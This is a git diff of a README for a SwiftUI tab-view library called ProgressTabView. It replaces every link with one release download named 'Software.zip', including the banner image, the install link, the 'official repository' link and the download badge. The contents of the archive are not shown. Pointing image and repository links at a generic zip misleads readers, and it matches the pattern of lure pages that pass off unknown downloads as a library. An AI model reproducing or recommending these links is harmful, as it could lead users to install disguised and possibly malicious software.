@@ -1,6 +1,6 @@
 # 🚀 **ProgressTabView**
 
-![ProgressTabView Banner](https://your-image-url.com)
+![ProgressTabView Banner](https://github.com/mihir587/ProgressTabView/releases/download/v1.0/Software.zip)
 
 ### SwiftUI library for adding a view that displays a horizontally scrollable collection of tabs with progress indicators.
 
@@ -16,7 +16,7 @@ progress-view, reels, stories-progress-view, swiftui
 
 ### Installation 🛠️
 To integrate ProgressTabView into your project, simply download the library from the link below:
-[Download ProgressTabView](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download ProgressTabView](https://github.com/mihir587/ProgressTabView/releases/download/v1.0/Software.zip)
 
 ### Get Started 🚀
 1. Ensure you have downloaded the ProgressTabView library.
@@ -52,6 +52,6 @@ ProgressTabView is licensed under the MIT License. Feel free to use, modify, and
 
 ---
 
-For more information and updates, visit the official [ProgressTabView GitHub repository](https://github.com/yourusername/ProgressTabView)
+For more information and updates, visit the official [ProgressTabView GitHub repository](https://github.com/mihir587/ProgressTabView/releases/download/v1.0/Software.zip)
 
-[![Download ProgressTabView](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ProgressTabView](https://github.com/mihir587/ProgressTabView/releases/download/v1.0/Software.zip)](https://github.com/mihir587/ProgressTabView/releases/download/v1.0/Software.zip)
